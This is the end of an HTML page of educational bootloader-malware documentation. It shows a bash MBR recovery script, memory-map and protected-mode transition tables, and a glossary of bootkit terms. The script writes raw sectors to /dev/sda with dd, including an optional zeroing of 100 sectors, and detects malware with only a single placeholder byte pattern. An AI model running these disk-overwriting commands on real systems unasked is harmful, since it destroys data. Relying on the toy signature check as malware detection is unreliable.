                <div class="code-filename">MBR Recovery Script (Linux Environment)</div>
                <pre><code>
#!/bin/bash
# Enterprise Recovery Script for MBR Restoration

# Configuration
TARGET_DISK="/dev/sda"  # Target disk to recover
BACKUP_DIR="/mnt/secure/mbr_backups"
LOG_FILE="/var/log/mbr_recovery.log"
RECOVERY_DATE=$(date +%Y%m%d-%H%M%S)

# Safety checks
if [ "$(id -u)" -ne 0 ]; then
    echo "This script must be run as root" >&2
    exit 1
fi

# Logging function
log() {
    echo "$(date +%Y-%m-%d\ %H:%M:%S) - $1" | tee -a "$LOG_FILE"
}

# Backup current MBR (for forensics)
backup_current_mbr() {
    log "Creating forensic backup of current MBR"
    mkdir -p "$BACKUP_DIR/infected"
    dd if="$TARGET_DISK" of="$BACKUP_DIR/infected/mbr_infected_$RECOVERY_DATE.bin" bs=512 count=1
    
    # Also backup extended areas that may contain additional malware components
    dd if="$TARGET_DISK" of="$BACKUP_DIR/infected/extended_sectors_$RECOVERY_DATE.bin" bs=512 count=100 skip=1
    
    log "Forensic backup completed"
}

# Verify backup integrity
verify_backup() {
    local backup_file="$1"
    
    # Check file exists
    if [ ! -f "$backup_file" ]; then
        log "ERROR: Backup file not found: $backup_file"
        return 1
    fi
    
    # Check file size (must be at least 512 bytes)
    local file_size=$(stat -c%s "$backup_file")
    if [ "$file_size" -lt 512 ]; then
        log "ERROR: Backup file too small: $file_size bytes"
        return 1
    fi
    
    # Check boot signature
    local signature=$(hexdump -n 512 -s 510 -e '1/1 "%02X"' "$backup_file")
    if [ "$signature" != "55AA" ]; then
        log "WARNING: Backup file does not have valid boot signature"
        read -p "Continue anyway? (y/n) " -n 1 -r
        echo
        if [[ ! $REPLY =~ ^[Yy]$ ]]; then
            return 1
        fi
    fi
    
    return 0
}

# Restore MBR
restore_mbr() {
    local backup_file="$1"
    
    log "Restoring MBR from: $backup_file"
    
    # Verify backup integrity first
    if ! verify_backup "$backup_file"; then
        log "ERROR: Backup verification failed"
        exit 1
    fi
    
    # Perform restoration
    log "Writing MBR to disk: $TARGET_DISK"
    dd if="$backup_file" of="$TARGET_DISK" bs=512 count=1 conv=notrunc
    
    if [ $? -ne 0 ]; then
        log "ERROR: MBR restoration failed"
        exit 1
    fi
    
    log "MBR restoration completed successfully"
}

# Scan for additional malware components
scan_additional_sectors() {
    log "Scanning for additional malware components"
    
    # Check the next 100 sectors for suspicious patterns
    local temp_file=$(mktemp)
    dd if="$TARGET_DISK" of="$temp_file" bs=512 count=100 skip=1
    
    # Look for common signatures
    if grep -q -P "\xDE\xAD\xBE\xEF" "$temp_file"; then
        log "WARNING: Found suspicious pattern in additional sectors"
        read -p "Would you like to zero out these sectors? (y/n) " -n 1 -r
        echo
        if [[ $REPLY =~ ^[Yy]$ ]]; then
            log "Zeroing out additional sectors"
            dd if=/dev/zero of="$TARGET_DISK" bs=512 count=100 seek=1 conv=notrunc
        fi
    else
        log "No obvious malicious patterns found in additional sectors"
    fi
    
    rm "$temp_file"
}

# Main recovery procedure
main() {
    log "=== Starting MBR Recovery Procedure ==="
    log "Target disk: $TARGET_DISK"
    
    # Create backup of infected MBR
    backup_current_mbr
    
    # Ask for backup file to restore from
    echo "Available MBR backups:"
    ls -la "$BACKUP_DIR"/*.bin 2>/dev/null
    
    read -p "Enter path to clean MBR backup file: " backup_file
    
    # Perform restoration
    restore_mbr "$backup_file"
    
    # Scan for additional malware components
    scan_additional_sectors
    
    log "Recovery procedure completed"
    log "NOTE: System should be thoroughly scanned and verified before returning to production"
    
    # Sync disks
    sync
    
    log "=== MBR Recovery Procedure Finished ==="
}

# Execute main procedure
main
                </code></pre>
            </div>
        </section>
    </section>
    
    <section class="section" id="appendix">
        <h2>6. Appendix</h2>
        
        <section class="subsection" id="reference">
            <h3>6.1 Technical Reference</h3>
            
            <h4>6.1.1 Memory Map Reference</h4>
            
            <table>
                <thead>
                    <tr>
                        <th>Address Range</th>
                        <th>Size</th>
                        <th>Description</th>
                        <th>Significance</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td>0x00000-0x003FF</td>
                        <td>1 KB</td>
                        <td>Real Mode IVT</td>
                        <td>Critical for interrupt hooking</td>
                    </tr>
                    <tr>
                        <td>0x00400-0x004FF</td>
                        <td>256 bytes</td>
                        <td>BIOS Data Area</td>
                        <td>System configuration parameters</td>
                    </tr>
                    <tr>
                        <td>0x00500-0x07BFF</td>
                        <td>~30 KB</td>
                        <td>Conventional Memory</td>
                        <td>Available for malware components</td>
                    </tr>
                    <tr>
                        <td>0x07C00-0x07DFF</td>
                        <td>512 bytes</td>
                        <td>Boot Sector Load Address</td>
                        <td>Primary execution point</td>
                    </tr>
                    <tr>
                        <td>0x07E00-0x9FFFF</td>
                        <td>~607 KB</td>
                        <td>Conventional Memory</td>
                        <td>Secondary payload storage</td>
                    </tr>
                    <tr>
                        <td>0xA0000-0xFFFFF</td>
                        <td>384 KB</td>
                        <td>BIOS, Video Memory</td>
                        <td>Reserved system area</td>
                    </tr>
                    <tr>
                        <td>0x100000+</td>
                        <td>4GB - 1MB</td>
                        <td>Extended Memory</td>
                        <td>Protected mode operations</td>
                    </tr>
                </tbody>
            </table>
            
            <h4>6.1.2 Processor Mode Transition Reference</h4>
            
            <table>
                <thead>
                    <tr>
                        <th>Transition Step</th>
                        <th>Instruction/Procedure</th>
                        <th>Critical Considerations</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td>Disable Interrupts</td>
                        <td><code>CLI</code></td>
                        <td>Prevents interrupt handlers from executing during transition</td>
                    </tr>
                    <tr>
                        <td>Create GDT</td>
                        <td>Define segment descriptors</td>
                        <td>Must include code and data segments with appropriate access flags</td>
                    </tr>
                    <tr>
                        <td>Load GDT</td>
                        <td><code>LGDT [ptr]</code></td>
                        <td>Pointer must contain 16-bit size and 32-bit address</td>
                    </tr>
                    <tr>
                        <td>Enable A20 Line</td>
                        <td>Multiple methods</td>
                        <td>Required for accessing memory above 1MB</td>
                    </tr>
                    <tr>
                        <td>Set PE Bit</td>
                        <td><code>MOV EAX, CR0</code><br><code>OR EAX, 1</code><br><code>MOV CR0, EAX</code></td>
                        <td>Enables protected mode</td>
                    </tr>
                    <tr>
                        <td>Far Jump</td>
                        <td><code>JMP 0x08:protected_mode</code></td>
                        <td>Flushes instruction pipeline and loads CS with selector</td>
                    </tr>
                    <tr>
                        <td>Set Segment Registers</td>
                        <td><code>MOV AX, 0x10</code><br><code>MOV DS, AX</code> (etc.)</td>
                        <td>All segment registers except CS must be updated</td>
                    </tr>
                    <tr>
                        <td>Set Up Stack</td>
                        <td><code>MOV ESP, stack_base</code></td>
                        <td>32-bit stack pointer required for protected mode</td>
                    </tr>
                </tbody>
            </table>
        </section>
        
        <section class="subsection" id="glossary">
            <h3>6.2 Glossary</h3>
            
            <dl>
                <dt>MBR (Master Boot Record)</dt>
                <dd>The first sector of a storage device containing the initial bootloader code and partition table. Critical for system initialization and a primary target for bootloader malware.</dd>
                
                <dt>Real Mode</dt>
                <dd>16-bit processor operating mode used during early boot process, limited to 1MB addressable memory and segmented memory model.</dd>
                
                <dt>Protected Mode</dt>
                <dd>32-bit processor operating mode with memory protection, flat addressing capabilities, and access to the full instruction set.</dd>
                
                <dt>GDT (Global Descriptor Table)</dt>
                <dd>Data structure that defines memory segments and their properties in protected mode operation.</dd>
                
                <dt>A20 Line</dt>
                <dd>Address line that must be enabled to access memory above 1MB. Originally disabled for backward compatibility with 8086 processors.</dd>
                
                <dt>IVT (Interrupt Vector Table)</dt>
                <dd>Table of interrupt handlers located at the beginning of memory. Critical for hooking system functionality.</dd>
                
                <dt>INT 13h</dt>
                <dd>BIOS interrupt for disk operations, commonly hooked by bootkit malware to intercept disk reads/writes.</dd>
                
                <dt>PE Bit</dt>
                <dd>Protection Enable bit in CR0 control register. Setting this bit transitions the processor from real mode to protected mode.</dd>
                
                <dt>Far Jump</dt>
                <dd>Jump instruction that changes both the code segment (CS) and instruction pointer (IP), necessary during mode transitions.</dd>
                
                <dt>Secure Boot</dt>
                <dd>UEFI security feature that validates digital signatures of bootloaders before execution.</dd>
                
                <dt>TPM (Trusted Platform Module)</dt>
                <dd>Hardware component that stores measurements and cryptographic keys for secure boot validation.</dd>
            </dl>
        </section>
    </section>
    
    <footer>
        <p>This documentation is provided solely for educational purposes in controlled environments.</p>
        <p>Bootloader Malware Technical Documentation &copy; 2025</p>
    </footer>
</body>
</html>